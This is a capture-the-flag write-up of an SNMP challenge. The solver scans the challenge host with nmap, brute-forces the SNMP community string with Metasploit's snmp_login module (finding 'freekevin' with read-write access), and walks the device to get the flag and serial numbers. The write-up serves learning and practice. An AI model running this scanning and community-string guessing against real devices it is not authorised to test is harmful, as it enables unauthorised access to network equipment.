# Super Simple

## Miscellaneous: 350 Points

## Challenge
I just bought this Cisco 1941 router off some guy in the park, but the data plate has been scraped off. Want to check with Cisco to make sure it's not stolen. Can you help me recover the serial number?

challenges.laptophackingcoffee.org 8161

(YES, I assure you, it's up)

## Solution

```
$ sudo install snmp
```

Failed attempts
```
1960  ssh root@challenges.laptophackingcoffee.org -p 8161
 1961  nmap
 1962  nmap -A challenges.laptophackingcoffee.org -p 8161
 1963  nmap -A challenges.laptophackingcoffee.org -p 8161 -Pn
 1964  nmap -sC -sV challenges.laptophackingcoffee.org -p 8161 -Pn
 1965  snmpget
 1966  sudo apt install snmp
 1967  snmpget help
 1968  snmpget challenges.laptophackingcoffee.org -c public sysName.0
 1969  snmpget challenges.laptophackingcoffee.org -c public
 1970  snmpget challenges.laptophackingcoffee.org -c public -v 2c
 1971  clear
 1972  snmpget challenges.laptophackingcoffee.org -c public -v 2c sysName.0
 1973  snmpget challenges.laptophackingcoffee.org -c public -v 2c sysName
 1974  snmpget -h
 1975  snmpwalk laptophackingcoffee.org -v 2c -c public system
 1976  snmpget challenges.laptophackingcoffee.org -v 2c -c public sysName.0
 1977  snmpwalk challenges.laptophackingcoffee.org -v 2c -c public
 1978  snmpwalk challenges.laptophackingcoffee.org -v 1 -c public
 1979  snmpwalk challenges.laptophackingcoffee.org:8161 -v 1 -c public
 1980  snmpwalk 35.237.149.50:8161 -v 1 -c public
 1981  snmpwalk 35.237.149.50 -v 1 -c public
 1982  snmpwalk 35.237.149.50:8161
 1983  snmpwalk 35.237.149.50:8161 -c public
 1984  snmpwalk 35.237.149.50:8161 -v 1
 1985  snmpwalk 35.237.149.50:8161 -v 1 -c public
 1986  telnet 35.237.149.50
 1987  telnet 35.237.149.50 8161
 1988  snmpwalk -v 1 -c public 35.237.149.50 1.3.6.1.2
 1989  nmap -A challenges.laptophackingcoffee.org -p 8161
 1990  nmap -A challenges.laptophackingcoffee.org -p 8161 -Pn
 1991  nc challenges.laptophackingcoffee.org 8161
 1992  snmpwalk -v 3 -c public 35.237.149.50
 1993  snmpwalk -v 3 -c public challenges.laptophackingcoffee.org
 1994  snmpwalk -v 3 -c public challenges.laptophackingcoffee.org -d
 1995  snmpwalk -v 3 -c public challenges.laptophackingcoffee.org -u public -p password
 1996  snmpwalk -v 3 -c public challenges.laptophackingcoffee.org -a password
 1997  snmpwalk -v 3 -c public challenges.laptophackingcoffee.org -A password
 1998  snmpwalk -v 3 -c public challenges.laptophackingcoffee.org -A password -a MD5
 1999  history
```

Nmap
```
$ nmap -sC -sV challenges.laptophackingcoffee.org -p 8161

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-13 21:04 MDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.28 seconds

$ nmap -sC -sV challenges.laptophackingcoffee.org -p 8161 -Pn

Starting Nmap 7.60 ( https://nmap.org ) at 2020-06-13 21:05 MDT
Nmap scan report for challenges.laptophackingcoffee.org (35.237.149.50)
Host is up.
rDNS record for 35.237.149.50: 50.149.237.35.bc.googleusercontent.com

PORT     STATE    SERVICE     VERSION
8161/tcp filtered patrol-snmp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.36 seconds
```


```
$ nmap -sC -sV challenges.laptophackingcoffee.org -p 8161
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 01:50 MDT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.32 seconds

$ nmap -sC -sV challenges.laptophackingcoffee.org -p 8161 -Pn
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 01:50 MDT
Nmap scan report for challenges.laptophackingcoffee.org (35.237.149.50)
Host is up.
rDNS record for 35.237.149.50: 50.149.237.35.bc.googleusercontent.com

PORT     STATE    SERVICE     VERSION
8161/tcp filtered patrol-snmp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.51 seconds
```

Boot up metasploit
https://www.youtube.com/watch?v=-WbTPKPqqhE
```
msf5 auxiliary(scanner/snmp/snmp_login) > show options

Module options (auxiliary/scanner/snmp/snmp_login):

   Name              Current Setting                                                       Required  Description
   ----              ---------------                                                       --------  -----------
   BLANK_PASSWORDS   false                                                                 no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                     yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                 no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                 no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                 no        Add all users in the current database to the list
   PASSWORD                                                                                no        The password to test
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt  no        File containing communities, one per line
   RHOSTS                                                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             161                                                                   yes       The target port
   STOP_ON_SUCCESS   false                                                                 yes       Stop guessing when a credential works for a host
   THREADS           1                                                                     yes       The number of concurrent threads (max one per host)
   USER_AS_PASS      false                                                                 no        Try the username as the password for all users
   VERBOSE           true                                                                  yes       Whether to print output for all attempts
   VERSION           1                                                                     yes       The SNMP version to scan (Accepted: 1, 2c, all)

msf5 auxiliary(scanner/snmp/snmp_login) > set rhosts challenges.laptophackingcoffee.org
rhosts => challenges.laptophackingcoffee.org
msf5 auxiliary(scanner/snmp/snmp_login) > set rport 8161
rport => 8161
msf5 auxiliary(scanner/snmp/snmp_login) > exploit

[!] No active DB -- Credential data will not be saved!
[+] 35.237.149.50:8161 - Login Successful: freekevin (Access level: read-write); Proof (sysDescr.0): 1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

```
snmpwalk -v1 -c freekevin -Ont challenges.laptophackingcoffee.org:8161

.1.3.6.1.2.1.47.1.1.1.1.10.10 = ""
.1.3.6.1.2.1.47.1.1.1.1.10.11 = ""
.1.3.6.1.2.1.47.1.1.1.1.10.12 = ""
.1.3.6.1.2.1.47.1.1.1.1.10.13 = ""
.1.3.6.1.2.1.47.1.1.1.1.10.14 = ""
.1.3.6.1.2.1.47.1.1.1.1.11.1 = STRING: "L H C { o n 3 _ s 1 x _ 0 n e _ e @ 5 E E } (Remove the spaces!)"
.1.3.6.1.2.1.47.1.1.1.1.11.2 = ""
.1.3.6.1.2.1.47.1.1.1.1.11.3 = STRING: "FOC165104EG"
.1.3.6.1.2.1.47.1.1.1.1.11.4 = ""
.1.3.6.1.2.1.47.1.1.1.1.11.5 = STRING: "FOC17105ESM"
.1.3.6.1.2.1.47.1.1.1.1.11.6 = ""
.1.3.6.1.2.1.47.1.1.1.1.11.7 = ""
.1.3.6.1.2.1.47.1.1.1.1.11.8 = ""
```